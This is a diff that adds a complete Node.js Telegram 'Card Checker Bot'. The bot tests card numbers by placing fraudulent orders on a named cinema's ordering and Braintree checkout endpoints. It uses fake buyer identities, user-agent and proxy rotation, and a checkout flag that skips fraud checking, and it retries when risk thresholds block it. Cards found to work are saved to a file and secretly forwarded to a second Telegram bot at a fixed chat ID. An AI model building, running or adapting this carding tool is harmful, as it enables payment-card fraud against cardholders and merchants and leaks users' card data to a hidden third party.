@@ -1,0 +1,467 @@
+const express = require('express');
+const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const { v4: uuidv4 } = require('uuid');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+
+// Configuration
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const FORWARDERSD_TOKEN = process.env.FORWARDERSD_TOKEN;
+const PROXY_HOST = process.env.PROXY_HOST || '';
+const PROXY_AUTH = process.env.PROXY_AUTH || '';
+
+if (!BOT_TOKEN) {
+    console.error('ERROR: BOT_TOKEN environment variable is required.');
+    process.exit(1);
+}
+
+const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+const PORT = process.env.PORT || 8080;
+
+// Create temp directory for cookies
+const COOKIE_DIR = path.join(os.tmpdir(), 'bot_cookies');
+if (!fs.existsSync(COOKIE_DIR)) {
+    fs.mkdirSync(COOKIE_DIR, { recursive: true });
+}
+
+// Session storage (in-memory)
+const sessions = {};
+
+// User Agent Generator
+class UserAgent {
+    constructor() {
+        this.userAgents = {
+            chrome: [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            ],
+            firefox: [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0'
+            ],
+            iphone: [
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
+            ]
+        };
+    }
+
+    generate(type = 'chrome') {
+        type = type.toLowerCase();
+        if (!this.userAgents[type]) {
+            type = 'chrome';
+        }
+        const agents = this.userAgents[type];
+        return agents[Math.floor(Math.random() * agents.length)];
+    }
+}
+
+const userAgent = new UserAgent();
+
+// Helper Functions
+function randomString(length) {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+function extractString(str, start, end) {
+    const startIndex = str.indexOf(start);
+    if (startIndex === -1) return '';
+    const substring = str.substring(startIndex + start.length);
+    const endIndex = substring.indexOf(end);
+    if (endIndex === -1) return '';
+    return substring.substring(0, endIndex);
+}
+
+function parseCard(card, validYYYY = 4) {
+    const parts = card.split('|');
+    let [cc, mm, yyyy, cvv] = parts;
+    
+    if (yyyy.length === 4 && validYYYY === 2) {
+        yyyy = yyyy.substring(2);
+    } else if (yyyy.length === 2 && validYYYY === 4) {
+        yyyy = '20' + yyyy;
+    }
+    
+    return { cc, mm, yyyy, cvv };
+}
+
+async function sendMessage(chatId, text, markdown = false) {
+    try {
+        const url = `${API_URL}sendMessage`;
+        await axios.get(url, {
+            params: {
+                chat_id: chatId,
+                text: text,
+                parse_mode: markdown ? 'Markdown' : undefined
+            }
+        });
+    } catch (error) {
+        console.error('Error sending message:', error.message);
+    }
+}
+
+async function forwardersd(message, chatId) {
+    if (!FORWARDERSD_TOKEN) return;
+    try {
+        const url = `https://api.telegram.org/bot${FORWARDERSD_TOKEN}/sendMessage`;
+        await axios.get(url, {
+            params: {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            }
+        });
+    } catch (error) {
+        console.error('Error forwarding message:', error.message);
+    }
+}
+
+function removeCookie(cookie) {
+    const files = fs.readdirSync(COOKIE_DIR);
+    files.forEach(file => {
+        if (file.includes(`_${cookie}.txt`)) {
+            fs.unlinkSync(path.join(COOKIE_DIR, file));
+        }
+    });
+}
+
+async function makeRequest(url, options = {}, sessionId, cookieId) {
+    const config = {
+        url,
+        method: options.post ? 'POST' : 'GET',
+        timeout: 30000,
+        headers: {
+            'User-Agent': sessions[sessionId]?.useragent || userAgent.generate(),
+            ...options.httpheader?.reduce((acc, header) => {
+                const [key, value] = header.split(': ');
+                acc[key] = value;
+                return acc;
+            }, {})
+        }
+    };
+
+    if (options.post) {
+        config.data = options.postfields;
+    }
+
+    // Setup proxy if provided
+    if (PROXY_HOST && PROXY_AUTH && !options.skipProxy) {
+        const proxyUrl = `http://${PROXY_AUTH}@${PROXY_HOST}`;
+        config.httpsAgent = new HttpsProxyAgent(proxyUrl);
+        config.proxy = false;
+    }
+
+    // Cookie handling
+    const cookieFile = path.join(COOKIE_DIR, `${process.pid}_${cookieId}.txt`);
+    if (fs.existsSync(cookieFile)) {
+        const cookies = fs.readFileSync(cookieFile, 'utf8');
+        config.headers['Cookie'] = cookies;
+    }
+
+    try {
+        const response = await axios(config);
+        
+        // Save cookies
+        if (response.headers['set-cookie']) {
+            fs.writeFileSync(cookieFile, response.headers['set-cookie'].join('; '));
+        }
+        
+        return response.data;
+    } catch (error) {
+        if (error.response) {
+            return error.response.data;
+        }
+        throw error;
+    }
+}
+
+// Express App
+const app = express();
+app.use(express.json());
+
+app.post('/', async (req, res) => {
+    const update = req.body;
+    
+    if (!update || !update.message) {
+        return res.sendStatus(200);
+    }
+
+    const message = update.message;
+    const chatId = message.chat.id;
+    const text = (message.text || '').trim();
+
+    if (!chatId) {
+        return res.sendStatus(200);
+    }
+
+    // Handle commands
+    if (text === '/start') {
+        await sendMessage(chatId, 
+            "🤖 *Card Checker Bot*\n\n*Commands:*\n/check - Check a card\n/help - Show help\n\n*Format:*\nSend card as: `4350940005555920|07|2025`\nor `4350940005555920|07|2025|123`", 
+            true
+        );
+        return res.sendStatus(200);
+    }
+
+    if (text === '/help') {
+        await sendMessage(chatId, 
+            "📋 *Help*\n\n*Card Format:*\n`CCNUMBER|MM|YYYY|CVV`\n\n*Example:*\n`4350940005555920|07|2025|123`\n\nJust send the card to check!", 
+            true
+        );
+        return res.sendStatus(200);
+    }
+
+    // Check if message contains card data
+    if (/^\d{15,16}\|/.test(text)) {
+        processCard(chatId, text);
+        return res.sendStatus(200);
+    } else {
+        await sendMessage(chatId, 
+            "❌ Invalid format!\n\nPlease send card in format:\n`CCNUMBER|MM|YYYY|CVV`\n\nExample:\n`4350940005555920|07|2025|123`", 
+            true
+        );
+        return res.sendStatus(200);
+    }
+});
+
+async function processCard(chatId, cardText) {
+    const cookie = randomString(10);
+    const sessionId = `session_${chatId}_${Date.now()}`;
+    
+    sessions[sessionId] = {
+        useragent: userAgent.generate()
+    };
+
+    try {
+        // Get random user info
+        const userInfo = await axios.get('https://randomuser.me/api/');
+        const user = userInfo.data.results[0];
+        
+        const userDetails = {
+            n: user.name.first,
+            l: user.name.last,
+            e: randomString(7) + '@gmail.com',
+            st: `${user.location.street.number} ${user.location.street.name}`,
+            ct: user.location.city,
+            state: user.location.state,
+            country: user.location.country,
+            zip: user.location.postcode,
+            phn: '212' + Math.floor(Math.random() * 10000000),
+            formkey: randomString(16),
+            webkey: randomString(16)
+        };
+
+        await sendMessage(chatId, `⏳ Checking: \`${cardText}\`\n\nPlease wait...`, true);
+
+        const { cc, mm, yyyy, cvv } = parseCard(cardText, 4);
+        const yy = yyyy.length === 4 ? yyyy.substring(2) : yyyy;
+
+        let retry = 0;
+        let result = null;
+
+        while (retry <= 3 && !result) {
+            try {
+                // Step 1: Create Order
+                const order = await makeRequest(
+                    'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/CreateOrder',
+                    {
+                        post: true,
+                        postfields: JSON.stringify({ cinemaId: "2110", userID: "" }),
+                        httpheader: ['content-type: application/json']
+                    },
+                    sessionId,
+                    cookie
+                );
+
+                const userSessionId = JSON.parse(order).Result.order.userSessionId;
+
+                // Step 2: Get Payment Client Token
+                const tokenResponse = await makeRequest(
+                    'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/PaymentClientToken',
+                    {
+                        post: true,
+                        postfields: JSON.stringify({ cinemaId: "2110" }),
+                        httpheader: ['content-type: application/json']
+                    },
+                    sessionId,
+                    cookie
+                );
+
+                const clientToken = JSON.parse(tokenResponse).ClientToken;
+                const decodedToken = Buffer.from(clientToken, 'base64').toString('utf-8');
+                const authorizationFingerprint = extractString(decodedToken, '"authorizationFingerprint":"', '"');
+
+                // Step 3: Add Concessions
+                await makeRequest(
+                    'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/vistaapi/AddConcessionsOrder',
+                    {
+                        post: true,
+                        postfields: `{"cinemaId":"2110","concessionItems":[{"Id":"144","HeadOfficeItemCode":"","HOPK":"144","Description":"BEER Santa Cruz Mtn Pacific IPA","DescriptionAlt":"","DescriptionTranslations":[],"ExtendedDescription":"","ExtendedDescriptionAlt":"","ExtendedDescriptionTranslations":[],"PriceInCents":950,"TaxInCents":84,"IsVariablePriceItem":false,"MinimumVariablePriceInCents":null,"MaximumVariablePriceInCents":null,"ItemClassCode":"0025","RequiresPickup":false,"CanGetBarcode":false,"ShippingMethod":"N","RestrictToLoyalty":false,"LoyaltyDiscountCode":"","RecognitionMaxQuantity":0,"RecognitionPointsCost":0,"RecognitionBalanceTypeId":null,"IsRecognitionOnly":false,"RecognitionId":0,"RecognitionSequenceNumber":0,"RecognitionExpiryDate":null,"RedeemableType":1,"IsAvailableForInSeatDelivery":false,"IsAvailableForPickupAtCounter":true,"VoucherSaleType":"","AlternateItems":[],"PackageChildItems":[],"ModifierGroups":[],"SmartModifiers":[],"DiscountsAvailable":[],"RecipeItems":[],"SellingLimits":{"DailyLimits":[],"IndefiniteLimit":null},"SellingTimeRestrictions":[],"RequiresPreparing":true,"is_restricted":false,"quantity":1,"IsSeatDelivery":false}],"userSessionId":"${userSessionId}","seats":[],"userID":""}`,
+                        httpheader: ['content-type: application/json']
+                    },
+                    sessionId,
+                    cookie
+                );
+
+                // Step 4: Tokenize Card
+                const braintreeResponse = await makeRequest(
+                    'https://payments.braintree-api.com/graphql',
+                    {
+                        post: true,
+                        postfields: JSON.stringify({
+                            clientSdkMetadata: {
+                                source: "client",
+                                integration: "dropin2",
+                                sessionId: uuidv4()
+                            },
+                            query: "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
+                            variables: {
+                                input: {
+                                    creditCard: {
+                                        number: cc,
+                                        expirationMonth: mm,
+                                        expirationYear: yyyy,
+                                        billingAddress: {
+                                            postalCode: String(Math.floor(Math.random() * 88889) + 11111)
+                                        }
+                                    },
+                                    options: { validate: false }
+                                }
+                            },
+                            operationName: "TokenizeCreditCard"
+                        }),
+                        httpheader: [
+                            'content-type: application/json',
+                            `Authorization: Bearer ${authorizationFingerprint}`,
+                            'braintree-version: 2018-05-10'
+                        ]
+                    },
+                    sessionId,
+                    cookie
+                );
+
+                const token = JSON.parse(braintreeResponse).data.tokenizeCreditCard.token;
+
+                // Step 5: Checkout
+                const checkoutResponse = await makeRequest(
+                    'https://www.santacruzcinema.com/wp-json/wp/v2/api/content/paymentapi/Checkout',
+                    {
+                        post: true,
+                        postfields: JSON.stringify({
+                            PaymentToken: token,
+                            userSessionId: userSessionId,
+                            Name: `${userDetails.n} ${userDetails.l}`,
+                            Email: userDetails.e,
+                            userID: "",
+                            skipBraintree: false,
+                            skipAdvancedFraudChecking: true,
+                            remainingOrderValue: -1
+                        }),
+                        httpheader: ['content-type: application/json']
+                    },
+                    sessionId,
+                    cookie
+                );
+
+                const responseText = typeof checkoutResponse === 'string' ? checkoutResponse : JSON.stringify(checkoutResponse);
+
+                // Check for retry conditions
+                if ((responseText.includes('risk_threshold') || 
+                     responseText.includes('Amount must be greater than zero') ||
+                     responseText.includes('This order has either expired') ||
+                     responseText.includes('Cannot determine payment method') ||
+                     !responseText) && retry < 3) {
+                    retry++;
+                    removeCookie(cookie);
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    continue;
+                }
+
+                // Check results
+                if (responseText.includes('avs') || 
+                    responseText.includes('"IsValid":true') || 
+                    responseText.includes('Insufficient') || 
+                    responseText.includes('Limit')) {
+                    
+                    // Save live card
+                    fs.appendFileSync('CCNLIVES_TG.txt', cardText + '\n');
+                    await forwardersd(`Live Card ${cc}|${mm}|${yyyy}|${cvv} galing bot pare`, 6050175626);
+                    
+                    const errorMsg = JSON.parse(responseText).ErrorMessage || 'Success';
+                    result = {
+                        status: 'live',
+                        message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
+                    };
+                } else if (retry >= 3) {
+                    let errorMsg = 'Unknown error';
+                    if (responseText.includes('risk_threshold')) {
+                        errorMsg = `Gateway Rejected: risk_threshold (after ${retry} retries)`;
+                    } else if (responseText.includes('Amount must be greater than zero')) {
+                        errorMsg = `Error: Amount must be greater than zero (after ${retry} retries)`;
+                    } else if (responseText.includes('Cannot determine payment method')) {
+                        errorMsg = `Error: Cannot determine payment method (after ${retry} retries)`;
+                    } else if (responseText.includes('This order has either expired')) {
+                        errorMsg = `Error: This order has either expired or it has already been processed (after ${retry} retries)`;
+                    } else if (!responseText) {
+                        errorMsg = `no response (after ${retry} retries)`;
+                    }
+                    
+                    result = {
+                        status: 'dead',
+                        message: `❌ *DEAD*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\n${errorMsg}`
+                    };
+                } else {
+                    const errorMsg = JSON.parse(responseText).ErrorMessage || 'Declined';
+                    result = {
+                        status: 'dead',
+                        message: `❌ *DEAD*\n\n💳 \`${cardText}\`\n\n📝 *Response:*\n${errorMsg}`
+                    };
+                }
+            } catch (error) {
+                if (retry < 3) {
+                    retry++;
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    continue;
+                }
+                throw error;
+            }
+        }
+
+        removeCookie(cookie);
+        delete sessions[sessionId];
+        
+        if (result) {
+            await sendMessage(chatId, result.message, true);
+        }
+
+    } catch (error) {
+        console.error('Error processing card:', error);
+        removeCookie(cookie);
+        delete sessions[sessionId];
+        await sendMessage(chatId, `⚠️ *ERROR*\n\n💳 \`${cardText}\`\n\n📝 *Error:*\n${error.message}`, true);
+    }
+}
+
+// Health check
+app.get('/', (req, res) => {
+    res.send('Telegram Bot is running!');
+});
+
+app.get('/health', (req, res) => {
+    res.json({ status: 'ok', timestamp: new Date().toISOString() });
+});
+
+app.listen(PORT, () => {
+    console.log(`✅ Bot server running on port ${PORT}`);
+    console.log(`✅ Webhook: https://your-domain.com/`);
+    console.log(`✅ Health: https://your-domain.com/health`);
+});
